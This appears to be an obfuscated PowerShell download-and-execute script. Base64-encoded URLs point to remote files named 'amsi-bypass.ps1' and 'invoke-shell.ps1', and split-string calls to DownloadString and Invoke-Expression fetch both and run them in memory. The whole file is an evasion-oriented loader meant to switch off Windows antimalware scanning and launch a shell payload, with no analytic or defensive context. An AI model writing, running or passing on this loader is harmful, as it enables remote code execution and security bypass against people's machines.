# Obfuscated PowerShell script to download and execute scripts in memory

# Obfuscated variable names and Base64-encoded URLs
${x9QzW7} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9hbXNpLWJ5cGFzcy5wczE='))
${kP4mR8vT} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9pbnZva2Utc2hlbGwucHMx'))

# Obfuscated WebClient creation and download
${qZ3nJ9} = &('New'+'-Object') ('System'+'.'+'Net'+'.'+'WebClient')
${vT2pL5} = ${qZ3nJ9}.('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'S'+'t'+'r'+'i'+'n'+'g').Invoke(${x9QzW7})

# Execute first script
&('I'+'n'+'v'+'o'+'k'+'e'+'-'+'E'+'x'+'p'+'r'+'e'+'s'+'s'+'i'+'o'+'n') ${vT2pL5}

# Obfuscated second download and execution
${mB7hY2} = &('New'+'-Object') ('System'+'.'+'Net'+'.'+'WebClient')
${rK8wN1} = ${mB7hY2}.('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'S'+'t'+'r'+'i'+'n'+'g').Invoke(${kP4mR8vT})

# Execute second script
&('I'+'n'+'v'+'o'+'k'+'e'+'-'+'E'+'x'+'p'+'r'+'e'+'s'+'s'+'i'+'o'+'n') ${rK8wN1}